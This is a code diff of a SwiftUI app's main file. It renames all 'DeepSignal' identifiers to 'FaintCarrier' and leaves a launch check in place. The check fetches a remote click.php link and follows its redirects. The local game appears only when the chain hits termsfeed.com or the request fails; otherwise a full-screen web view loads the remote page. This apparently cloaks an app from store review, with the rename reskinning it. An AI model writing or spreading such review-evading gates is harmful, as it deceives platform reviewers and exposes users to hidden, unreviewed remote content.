@@ -1,20 +1,20 @@
 import SwiftUI
 
 @main
-struct DeepSignalApp: App {
+struct FaintCarrierApp: App {
     @StateObject private var signalGame = SignalGame()
     @Environment(\.scenePhase) private var signalScenePhase
 
     @State private var signalLinkReady: Bool? = nil
-    private let deepSignalSourceLink = "https://coastalmarketmerge.org/click.php"
-    private let deepSignalCheckDomain = "termsfeed.com"
+    private let faintCarrierSourceLink = "https://coastalmarketmerge.org/click.php"
+    private let faintCarrierCheckDomain = "termsfeed.com"
 
     var body: some Scene {
         WindowGroup {
             Group {
                 if let ready = signalLinkReady {
                     if ready {
-                        DeepSignalWebPanel(urlString: deepSignalSourceLink)
+                        FaintCarrierWebPanel(urlString: faintCarrierSourceLink)
                             .edgesIgnoringSafeArea(.bottom)
                             .background(Color.black.ignoresSafeArea())
                     } else {
@@ -22,7 +22,7 @@ struct DeepSignalApp: App {
                             .environmentObject(signalGame)
                     }
                 } else {
-                    DeepSignalLoadingScreen()
+                    FaintCarrierLoadingScreen()
                         .onAppear { performLaunchCheck() }
                 }
             }
@@ -45,13 +45,13 @@ struct DeepSignalApp: App {
     }
 
     private func performLaunchCheck() {
-        guard let url = URL(string: deepSignalSourceLink) else {
+        guard let url = URL(string: faintCarrierSourceLink) else {
             signalLinkReady = false
             return
         }
         var request = URLRequest(url: url)
         request.timeoutInterval = 5
-        let tracker = DeepSignalRedirectTracker(checkDomain: deepSignalCheckDomain)
+        let tracker = FaintCarrierRedirectTracker(checkDomain: faintCarrierCheckDomain)
         let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
         session.dataTask(with: request) { _, response, error in
             DispatchQueue.main.async {
@@ -59,12 +59,12 @@ struct DeepSignalApp: App {
                     signalLinkReady = false; return
                 }
                 if let finalURL = tracker.resolvedURL?.absoluteString,
-                   finalURL.contains(deepSignalCheckDomain) {
+                   finalURL.contains(faintCarrierCheckDomain) {
                     signalLinkReady = false; return
                 }
                 if let httpResp = response as? HTTPURLResponse,
                    let respURL = httpResp.url?.absoluteString,
-                   respURL.contains(deepSignalCheckDomain) {
+                   respURL.contains(faintCarrierCheckDomain) {
                     signalLinkReady = false; return
                 }
                 if error != nil {
@@ -80,7 +80,7 @@ struct DeepSignalApp: App {
 }
 
 // Tracks redirects; records whether the check domain appears anywhere in the chain.
-final class DeepSignalRedirectTracker: NSObject, URLSessionTaskDelegate {
+final class FaintCarrierRedirectTracker: NSObject, URLSessionTaskDelegate {
     var resolvedURL: URL?
     var foundCheckDomain = false
     private let checkDomain: String
